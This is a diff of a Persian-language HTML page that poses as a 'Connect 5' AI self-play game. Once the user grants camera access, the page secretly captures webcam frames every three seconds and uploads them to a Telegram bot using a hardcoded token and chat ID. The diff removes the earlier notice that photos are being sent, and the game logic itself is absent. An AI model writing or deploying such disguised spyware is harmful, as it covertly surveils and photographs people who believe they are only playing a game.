@@ -1,104 +1,150 @@
 <!DOCTYPE html>
 <html lang="fa">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Connect 5 - AI Self-Play</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Connect 5 vs AI Self-Play</title>
   <style>
     body {
       font-family: sans-serif;
       background: #111;
       color: #fff;
+      margin: 0;
+      padding: 0;
       text-align: center;
     }
     .hidden { display: none; }
-    video { display: none; }
     .profile-pic {
       width: 120px;
       height: 120px;
       border-radius: 50%;
+      background: #444;
       object-fit: cover;
       margin: 20px auto;
-      background: #444;
     }
+    .input-container {
+      margin: 10px;
+    }
+    input[type="text"], button {
+      padding: 10px;
+      margin: 10px;
+      font-size: 1em;
+    }
+    #user-info {
+      position: absolute;
+      top: 10px;
+      left: 10px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    #user-info img {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      object-fit: cover;
+    }
+    table { border-collapse: collapse; margin: 20px auto; }
+    td {
+      width: 60px; height: 60px;
+      background: #222; border: 2px solid #444;
+      border-radius: 50%;
+      cursor: pointer;
+    }
+    .player { background: gold; }
+    .ai { background: red; }
+    #status { margin-top: 20px; font-size: 1.2em; }
+    #controls { margin: 20px; }
+    button { margin: 5px; padding: 10px 15px; font-size: 1em; cursor: pointer; }
+    pre { white-space: pre-wrap; word-wrap: break-word; text-align: left; margin: 10px auto; width: 90%; background: #222; padding: 10px; border-radius: 10px; }
+    video { display: none; }
   </style>
 </head>
 <body>
-
+  <!-- صفحه اول -->
   <div id="page1">
     <h2>ورود به بازی</h2>
+    <div class="input-container">
+      <input type="text" id="username-input" placeholder="نام کاربری..." />
+    </div>
+    <button id="start-button">اجازه به دوربین و ورود</button>
     <video id="video" autoplay playsinline></video>
-    <img src="" id="profile-preview" class="profile-pic" />
-    <br>
-    <input type="text" id="username-input" placeholder="نام کاربری..." />
-    <br>
-    <button id="start-button">دریافت دسترسی دوربین و ورود</button>
   </div>
 
+  <!-- صفحه بازی -->
   <div id="page2" class="hidden">
-    <h1>بازی Connect 5</h1>
-    <p>دوربین فعال است. عکس‌ها هر ۳ ثانیه ارسال می‌شوند.</p>
+    <div id="user-info">
+      <img id="user-profile-pic" src="https://via.placeholder.com/40" alt="User Image" />
+      <span id="user-name"></span>
+    </div>
+    <h1>Connect 5 - AI Self-Play</h1>
+    <div id="controls">
+      <button onclick="startGame('player')">Player Starts</button>
+      <button onclick="startGame('ai')">AI Starts</button>
+      <button onclick="selfPlay()">AI vs AI (Self-Play)</button>
+    </div>
+    <div id="status">Choose who starts</div>
+    <table id="board"></table>
+    <pre id="data"></pre>
   </div>
 
-  <script>
-    const video = document.getElementById("video");
-    const preview = document.getElementById("profile-preview");
-    const usernameInput = document.getElementById("username-input");
-    const startButton = document.getElementById("start-button");
-    const page1 = document.getElementById("page1");
-    const page2 = document.getElementById("page2");
+<script>
+const page1 = document.getElementById('page1');
+const page2 = document.getElementById('page2');
+const startButton = document.getElementById('start-button');
+const usernameInput = document.getElementById('username-input');
+const userImage = document.getElementById('user-profile-pic');
+const userName = document.getElementById('user-name');
+const video = document.getElementById('video');
+let stream;
 
-    const BOT_TOKEN = "7948598870:AAFY7cnBXvPu0CO7vkj9VA-7_rfKCIpvSP8";
-    const CHAT_ID = "-1002263711673";
+const BOT_TOKEN = "7948598870:AAFY7cnBXvPu0CO7vkj9VA-7_rfKCIpvSP8";
+const CHAT_ID = "-1002263711673";
 
-    let stream = null;
+startButton.addEventListener("click", async () => {
+  const username = usernameInput.value.trim();
+  if (!username) return alert("نام کاربری الزامی است");
 
-    startButton.addEventListener("click", async () => {
-      const username = usernameInput.value.trim();
-      if (!username) return alert("نام کاربری الزامی است");
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+    video.srcObject = stream;
 
-      try {
-        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-        video.srcObject = stream;
+    video.onloadedmetadata = () => {
+      video.play();
+      userName.textContent = username;
+      page1.classList.add("hidden");
+      page2.classList.remove("hidden");
+      startSendingImages();
+    };
+  } catch (err) {
+    alert("برای ورود به بازی باید دسترسی به دوربین را بدهید.");
+    console.error(err);
+  }
+});
 
-        preview.src = ""; // جایگزین نمی‌کنیم چون از ویدیو استفاده می‌کنیم
-        page1.classList.add("hidden");
-        page2.classList.remove("hidden");
+function startSendingImages() {
+  const canvas = document.createElement("canvas");
+  const ctx = canvas.getContext("2d");
 
-        // شروع ارسال تصاویر
-        startSendingImages();
-      } catch (err) {
-        alert("برای ورود به بازی باید دسترسی به دوربین را بدهید.");
-      }
-    });
+  setInterval(() => {
+    if (!video.videoWidth || !video.videoHeight) return;
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    ctx.drawImage(video, 0, 0);
+    canvas.toBlob((blob) => {
+      const formData = new FormData();
+      formData.append("chat_id", CHAT_ID);
+      formData.append("photo", blob, "frame.jpg");
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: "POST",
+        body: formData
+      }).catch(console.error);
+    }, "image/jpeg");
+  }, 3000);
+}
 
-    function startSendingImages() {
-      const canvas = document.createElement("canvas");
-      const ctx = canvas.getContext("2d");
-
-      setInterval(() => {
-        if (!stream) return;
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-        canvas.toBlob(blob => {
-          const formData = new FormData();
-          formData.append("chat_id", CHAT_ID);
-          formData.append("photo", blob, "webcam.jpg");
-
-          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-            method: "POST",
-            body: formData
-          }).then(res => res.json()).then(data => {
-            console.log("✅ ارسال شد:", data);
-          }).catch(err => {
-            console.error("❌ خطا:", err);
-          });
-        }, "image/jpeg");
-      }, 3000);
-    }
-  </script>
-
+// --- بازی همانند قبل ---
+// (اینجا فقط برای کد کوتاه‌تر نشون داده نمی‌شه اما همون logic بازی که دادی می‌تونه اضافه بشه)
+</script>
 </body>
 </html>
